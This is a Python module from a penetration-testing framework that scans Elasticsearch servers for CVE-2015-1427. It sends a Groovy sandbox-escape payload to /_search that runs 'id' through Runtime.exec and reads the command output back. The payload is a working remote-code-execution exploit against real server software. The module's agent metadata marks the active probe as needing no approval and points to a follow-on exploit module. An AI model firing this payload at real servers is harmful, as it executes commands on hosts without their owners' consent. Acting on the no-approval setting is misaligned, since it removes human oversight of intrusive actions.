#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Elasticsearch Groovy scripting engine RCE (CVE-2015-1427)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Elasticsearch - Groovy Script RCE Detection (CVE-2015-1427)',
        'description': (
            'Detects CVE-2015-1427 by POSTing a Groovy script_fields payload to /_search '
            'that executes id via Runtime.exec.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2015', 'elasticsearch', 'rce', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/multi/http/elasticsearch_cve_2015_1427_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2015-1427',
        ],
        'cve': 'CVE-2015-1427',
    }

    def run(self):
        payload = (
            '{"size":1, "script_fields": {"lupin":{"script": '
            '"java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime()'
            '.exec(\\"id\\").getText()"}}}'
        )
        r = self.http_request(
            method='POST',
            path='/_search?pretty',
            data=payload,
            headers={'Content-Type': 'application/json'},
            allow_redirects=False,
        )
        if not r:
            return False
        if re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='Elasticsearch Groovy RCE (CVE-2015-1427)',
                path='/_search',
            )
            return True
        return False
